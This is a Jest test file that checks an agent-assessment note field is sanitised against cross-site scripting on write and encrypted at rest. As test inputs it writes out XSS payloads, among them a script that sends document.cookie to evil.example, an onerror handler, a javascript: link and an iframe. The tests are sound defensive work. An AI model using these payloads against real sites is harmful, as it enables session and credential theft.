/* eslint-disable @typescript-eslint/no-explicit-any -- test doubles that mirror
 * a Prisma transaction client; per-line typing has poor cost/benefit here and
 * the file-level disable is this repo's standard for the shape. */
/**
 * The agent-assessment answer note: sanitised on write, encrypted at rest.
 *
 * Two independent protections that are often mistaken for one, so both are
 * asserted here and the difference is stated:
 *
 *   • ENCRYPTION (Epic B) protects the value while it sits in the database. It
 *     does nothing at all for a renderer, because every renderer decrypts
 *     first. A `<script>` in an encrypted column is a `<script>` the moment
 *     anybody reads it.
 *   • SANITISATION (Epic D) protects every downstream consumer that decrypts
 *     and prints the field — the operator surface, a PDF export, an audit-pack
 *     share link, an SDK consumer reading the row verbatim. It has to happen at
 *     the WRITE seam, because a renderer that forgets is a renderer nobody
 *     notices until the row is already dangerous.
 *
 * The note on this model is the operator's own account of which guardrail is
 * missing on an autonomous agent, so it is exactly the row an attacker would
 * want to read and exactly the row a compliance PDF will print.
 */
jest.mock('@/lib/db-context', () => ({
    runInTenantContext: jest.fn(),
}));

jest.mock('@/app-layer/events/audit', () => ({
    logEvent: jest.fn().mockResolvedValue(undefined),
}));

import { saveAgentAssessmentAnswer } from '@/app-layer/usecases/agent-risk-assessment';
import { runInTenantContext } from '@/lib/db-context';
import { ENCRYPTED_FIELDS } from '@/lib/security/encrypted-fields';
import { makeRequestContext } from '../../helpers/make-context';

const mockRunInTx = runInTenantContext as jest.MockedFunction<any>;
const ctx = makeRequestContext('ADMIN', { tenantId: 'tenant-1', userId: 'user-1' });

const AGENT_ID = 'agent-1';

/** Records the row the usecase actually handed to the database. */
function makeDb() {
    const upserts: any[] = [];
    const db: any = {
        registeredAgent: {
            findFirst: jest.fn(async () => ({
                id: AGENT_ID,
                name: 'Ops agent',
                autonomyLevel: 2,
                dataAccessScope: 'READ_TENANT_DATA',
                reversibility: 'COMPENSABLE',
                provenance: 'FIRST_PARTY',
                modelRef: null,
                riskTier: null,
                riskTierScoredAt: null,
                _count: { tools: 0 },
            })),
        },
        agentAssessmentQuestion: {
            findUnique: jest.fn(async ({ where }: any) => ({ id: where.id })),
        },
        agentRiskAssessment: {
            findFirst: jest.fn(async () => ({
                id: 'assessment-1',
                status: 'IN_PROGRESS',
                questionSetVersion: 1,
            })),
            create: jest.fn(),
            updateMany: jest.fn(async () => ({ count: 1 })),
        },
        agentRiskAssessmentAnswer: {
            upsert: jest.fn(async (args: any) => {
                upserts.push(args);
                return { id: 'answer-1', ...args.create };
            }),
        },
    };
    return { db, upserts };
}

async function saveNote(note: string) {
    const { db, upserts } = makeDb();
    mockRunInTx.mockImplementation(async (_ctx: unknown, fn: any) => fn(db));
    await saveAgentAssessmentAnswer(ctx, AGENT_ID, {
        questionId: 'ara-1-01',
        answer: 'PARTIALLY',
        note,
    });
    return upserts[0];
}

beforeEach(() => jest.clearAllMocks());

describe('the note is sanitised at the write seam', () => {
    it('a <script> tag is stripped before the row is written', async () => {
        const call = await saveNote(
            '<script>fetch("//evil.example/"+document.cookie)</script>Tool allowlist is partial',
        );
        expect(call.create.note).toBe('Tool allowlist is partial');
        expect(call.update.note).toBe('Tool allowlist is partial');
        // Stated as an absence too: the assertion above would still pass if the
        // sanitiser merely reordered the string.
        expect(call.create.note).not.toContain('<script');
        expect(call.create.note).not.toContain('document.cookie');
    });

    it.each([
        ['an inline event handler', '<img src=x onerror="steal()">note body', 'note body'],
        ['a javascript: link', '<a href="javascript:steal()">click</a>ok', 'clickok'],
        ['an iframe', '<iframe src="//evil.example"></iframe>text', 'text'],
    ])('%s does not survive the write', async (_label, hostile, expected) => {
        const call = await saveNote(hostile);
        expect(call.create.note).toBe(expected);
        expect(call.create.note).not.toMatch(/<[a-z]/i);
    });

    it('an ordinary note is passed through unharmed', async () => {
        // A sanitiser that mangles legitimate prose gets switched off, so this
        // is as load-bearing as the stripping tests above.
        const plain = 'Approver reviews each proposal; kill switch drilled 2026-08-14.';
        const call = await saveNote(plain);
        expect(call.create.note).toBe(plain);
    });

    it('an absent note is stored as NULL rather than an empty string', async () => {
        const { db, upserts } = makeDb();
        mockRunInTx.mockImplementation(async (_ctx: unknown, fn: any) => fn(db));
        await saveAgentAssessmentAnswer(ctx, AGENT_ID, {
            questionId: 'ara-1-01',
            answer: 'YES',
        });
        expect(upserts[0].create.note).toBeNull();
    });
});

describe('the column is in the encryption manifest', () => {
    it('AgentRiskAssessmentAnswer.note is encrypted at rest', () => {
        // Asserted against the exported manifest VALUE, not against the source
        // text of the file: a grep for the model name would also be satisfied by
        // a comment mentioning it, and by the sibling model whose name contains
        // this one as a prefix.
        expect(ENCRYPTED_FIELDS.AgentRiskAssessmentAnswer).toEqual(['note']);
    });

    it('and the structured answer beside it is NOT — it has to stay queryable', () => {
        expect(ENCRYPTED_FIELDS.AgentRiskAssessmentAnswer).not.toContain('answer');
    });
});
